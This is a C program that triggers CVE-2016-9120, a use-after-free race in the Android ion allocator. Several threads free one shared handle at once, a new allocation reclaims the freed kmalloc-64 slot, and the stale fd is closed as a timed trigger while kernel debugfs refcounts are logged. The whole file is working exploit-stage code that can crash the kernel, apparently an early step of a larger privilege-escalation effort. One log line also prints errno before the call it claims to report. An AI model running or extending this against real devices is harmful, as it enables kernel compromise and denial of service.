#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <dirent.h>

/* Mechanism observer for CVE-2016-9120 on this build -- no template, no spray, no
 * kernel write.  It answers one question with a kernel-side oracle: does a concurrent
 * FREE storm really destroy a LIVE handle early and free its ion_buffer while a
 * ION_SHARE fd we kept still refers to it?
 *
 * ion's own debugfs prints "size : handle refcount : buffer" per handle and the buffer
 * refcounts, i.e. the kernel tells us the refcount arithmetic directly (ledger S44).
 * Every step is dumped, so if the box dies the last marker in the log names the step
 * that killed it.  Ordering matters more than volume here: 4 racers => 3 stray puts
 * (ledger S37.2), so this can legitimately panic -- that answer is also data. */
#define ION_ALLOC   0xc0204900u
#define ION_FREE    0xc0044901u
#define ION_SHARE   0xc0084904u

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };

static int g_ionfd;
static volatile unsigned g_id, g_go, g_ready, g_done;
static int g_nracer = 4;

static void show_filtered(int fd, const char *pidstr, const char *name)
{
    char *all = malloc(1 << 16);
    size_t got = 0;
    int n;

    if (!all) { close(fd); return; }
    while (got < (1u << 16) - 1 && (n = read(fd, all + got, 4096)) > 0)
        got += (size_t)n;
    all[got] = 0;
    close(fd);
    {
        char *p = all;
        int shown = 0;
        while (p && *p) {
            char *e = strchr(p, '\n');
            if (e) *e++ = 0;
            if (strstr(p, pidstr) || strstr(p, "refcount") || strstr(p, "total")) {
                if (!shown++)
                    printf("  [%s]", name);
                printf("  | %s\n", p);
            }
            p = e;
        }
    }
    free(all);
}

static void dump(const char *tag)
{
    char path[256], pidstr[16];
    DIR *d;
    struct dirent *e;

    snprintf(pidstr, sizeof pidstr, "%d", getpid());
    printf("---- %s (pid %s) ----\n", tag, pidstr);
    fflush(stdout);

    d = opendir("/sys/kernel/debug/ion/heaps");
    if (d) {
        while ((e = readdir(d))) {
            int fd;
            if (e->d_name[0] == '.')
                continue;
            snprintf(path, sizeof path, "/sys/kernel/debug/ion/heaps/%s", e->d_name);
            fd = open(path, O_RDONLY);
            if (fd < 0)
                continue;
            show_filtered(fd, pidstr, e->d_name);
        }
        closedir(d);
    } else {
        printf("  opendir ion/heaps: %s\n", strerror(errno));
    }

    d = opendir("/sys/kernel/debug/ion/clients");
    if (d) {
        while ((e = readdir(d))) {
            char nm[64];
            int fd;
            if (e->d_name[0] == '.')
                continue;
            snprintf(nm, sizeof nm, "-%s", pidstr);
            if (!strstr(e->d_name, nm))
                continue;
            snprintf(path, sizeof path, "/sys/kernel/debug/ion/clients/%s", e->d_name);
            fd = open(path, O_RDONLY);
            if (fd < 0)
                continue;
            printf("  [client %s]\n", e->d_name);
            for (;;) {
                char buf[1024];
                int n = read(fd, buf, sizeof buf - 1);
                if (n <= 0)
                    break;
                buf[n] = 0;
                fwrite(buf, 1, (size_t)n, stdout);
            }
            close(fd);
        }
        closedir(d);
    }
    fflush(stdout);
}

static void *racer(void *a)
{
    unsigned id = g_id;
    int r;
    (void)a;
    __atomic_add_fetch(&g_ready, 1, __ATOMIC_SEQ_CST);
    while (!g_go)
        sched_yield();
    errno = 0;
    r = ioctl(g_ionfd, ION_FREE, &id);
    if (r && errno != EINVAL)
        printf("  racer FREE rc=%d errno=%d\n", r, errno);
    __atomic_add_fetch(&g_done, 1, __ATOMIC_SEQ_CST);
    return NULL;
}

int main(int argc, char **argv)
{
    struct alloc_data ad;
    struct fd_data sd;
    pthread_t th[8];
    unsigned mask = argc > 2 ? (unsigned)strtoul(argv[2], NULL, 0) : (1u << 9);
    int j, fd1 = -1, fd2 = -1, h2 = 0;

    g_nracer = argc > 1 ? atoi(argv[1]) : 4;
    if (g_nracer < 2) g_nracer = 2;
    if (g_nracer > 8) g_nracer = 8;
    setvbuf(stdout, NULL, _IONBF, 0);

    g_ionfd = open("/dev/ion", O_RDONLY);
    if (g_ionfd < 0) { perror("open /dev/ion"); return 1; }
    printf("step1: storm ONE free id (racers=%d mask=%x)\n", g_nracer, mask);
    fflush(stdout);
    dump("step 0 baseline");

    memset(&ad, 0, sizeof ad);
    ad.len = 4096; ad.align = 4096; ad.mask = mask;
    errno = 0;
    if (ioctl(g_ionfd, ION_ALLOC, &ad)) { printf("alloc errno=%d\n", errno); return 2; }
    g_id = ad.handle;
    printf("  h1 = %u\n", g_id);

    memset(&sd, 0, sizeof sd);
    sd.handle = g_id;
    errno = 0;
    if (ioctl(g_ionfd, ION_SHARE, &sd) == 0)
        fd1 = sd.fd;
    printf("  share fd1 = %d errno=%d\n", fd1, errno);
    dump("step 1 after ALLOC h1 + SHARE");

    g_go = 0; g_ready = 0; g_done = 0;
    for (j = 0; j < g_nracer; j++)
        if (pthread_create(&th[j], NULL, racer, NULL)) { printf("racer: %s\n", strerror(errno)); return 3; }
    while (g_ready < (unsigned)g_nracer)
        sched_yield();
    g_go = 1;
    while (g_done < (unsigned)g_nracer)
        sched_yield();
    for (j = 0; j < g_nracer; j++)
        pthread_join(th[j], NULL);
    printf("step2: storm done (%d racers => %d stray puts)\n", g_nracer, g_nracer - 1);
    dump("step 2 after storm");

    memset(&ad, 0, sizeof ad);
    ad.len = 4096; ad.align = 4096; ad.mask = mask;
    errno = 0;
    if (ioctl(g_ionfd, ION_ALLOC, &ad) == 0) {
        h2 = ad.handle;
        printf("step3: ALLOC h2 = %u (reuses the kmalloc-64 slot h1 left)\n", h2);
    } else {
        printf("step3: ALLOC h2 failed errno=%d\n", errno);
    }
    memset(&sd, 0, sizeof sd);
    sd.handle = h2;
    if (h2 && ioctl(g_ionfd, ION_SHARE, &sd) == 0)
        fd2 = sd.fd;
    dump("step 3 after ALLOC/SHARE h2");

    printf("step4: close(fd1) -- the deferred ion_buffer_put, our own timed trigger\n");
    fflush(stdout);
    if (fd1 >= 0)
        close(fd1);
    dump("step 4 after close(fd1)");

    printf("step5: FREE h2 then close(fd2)\n");
    fflush(stdout);
    if (h2) {
        unsigned id2 = (unsigned)h2;
        errno = 0;
        printf("  FREE h2 rc/errno=%d\n", errno);
        ioctl(g_ionfd, ION_FREE, &id2);
    }
    if (fd2 >= 0)
        close(fd2);
    dump("step 5 end");
    printf("DONE alive\n");
    close(g_ionfd);
    return 0;
}
